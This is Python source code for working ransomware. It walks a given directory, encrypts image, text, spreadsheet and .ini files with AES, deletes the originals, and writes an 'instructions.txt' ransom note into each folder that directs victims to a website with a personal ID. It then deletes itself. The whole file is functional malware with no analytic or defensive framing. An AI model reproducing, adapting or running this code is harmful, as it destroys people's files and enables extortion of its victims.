#!/usr/bin/python3

from sys import argv
from os import walk, lstat
from os.path import getsize, join, isdir
from os import remove as rm
from struct import pack
from Crypto.Cipher import AES
import Crypto.Random as rand
import webbrowser
import random
import string
import hashlib


_INSTRUCTIONS = """
!!! IMPORTANT INFORMATIONS !!!

All of your files have been encrypted with AES128 cipher.
Your data cannot be recovered without the encryption key.

To decrypt your files, please go on the folowing website:

https://bunnypixelarray.github.io/

Your personnal ID key is: 

"""

base = ''.join(random.SystemRandom().choice(
    string.ascii_uppercase + string.digits) for _ in range(32))

_INSTRUCTIONS += base

cuted = ''

for i in [0, 22, 3, 12, 14, 15, 16, 22, 2, 8, 26, 11, 13, 24, 4, 3]:
    cuted += base[i]

hashed = hashlib.sha224(bytes(cuted, "utf-8")).hexdigest()

recuted = ''

for i in [4, 12, 25, 15, 22, 37, 36, 16, 12, 28, 17, 30,
          2, 49, 20, 1, 17, 8, 3, 9, 0, 12, 37, 14, 43,
          13, 45, 44, 31, 52]:
    recuted += hashed[i]

rehashed = hashlib.sha512(bytes(cuted, "utf-8")).hexdigest()

final_key = ''

for i in [8, 2, 15, 37, 31, 8, 12, 45, 23, 41, 3, 18, 12, 47, 43, 10]:
    final_key += rehashed[i]


AUTORM = not "-keep" in argv
LEN_READ = 1024
FILE_EXT = '.enc'

TARGETS = (".jpg", ".ini", ".xls", ".xlsx", ".txt")

if not len(argv) in [2, 3] or (len(argv) == 2 and not AUTORM) or (len(argv) == 3 and AUTORM):
    print("%s directory [-keep]" % (argv[0]))
    exit(0)


def recur_mtime(path):
    for dirpath, dirnames, filenames in walk(path):
        yield 0.0, dirpath
        for fn in filenames:
            filepath = join(dirpath, fn)
            try:
                mtime = lstat(filepath).st_mtime
            except:
                mtime = 0.0
            yield mtime, filepath


def walk_sorted(path):
    global TARGETS
    for mtime, filepath in sorted(recur_mtime(path), reverse=True):
        if filepath.endswith(TARGETS) and filepath.split("/")[-1] != "instructions.txt" and filepath.split("/")[-1] != argv[0]:
            yield filepath, False
        if isdir(filepath):
            yield filepath, True


def crypt(key, filename):
    global LEN_READ, FILE_EXT
    newname = filename + FILE_EXT
    iv = rand.new().read(16)
    size = getsize(filename)
    cryptor = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, "rb") as f_in:
        with open(newname, "wb") as f_out:
            f_out.write(pack('Q', size))
            f_out.write(iv)
            while True:
                txt = f_in.read(LEN_READ)
                l = len(txt)
                if l != LEN_READ:
                    if not l:
                        break
                    txt += rand.new().read(LEN_READ - l)
                f_out.write(cryptor.encrypt(txt))
                del txt


def crypted_file(filename):
    global FILE_EXT
    return (True if filename.endswith(FILE_EXT) else False)


def write_instructions(path):
    instructions_path = join(path, "instructions.txt")
    with open(instructions_path, "w") as file:
        file.write(_INSTRUCTIONS)


def main():
    key = bytes(final_key, "utf-8")
    for name, isdirectory in walk_sorted(argv[1]):
        if isdirectory:
            write_instructions(name)
        elif not crypted_file(name):
            try:
                print(name)
                crypt(key, name)
                rm(name)
            except:
                print("Encrypt failure : {}".format(name))

    # webbrowser.open_new('http://bunnypixelarray.github.io')
    if AUTORM:
        try:
            rm(argv[0])
        except:
            print("auto-remove failure")


if (__name__ == "__main__"):
    main()
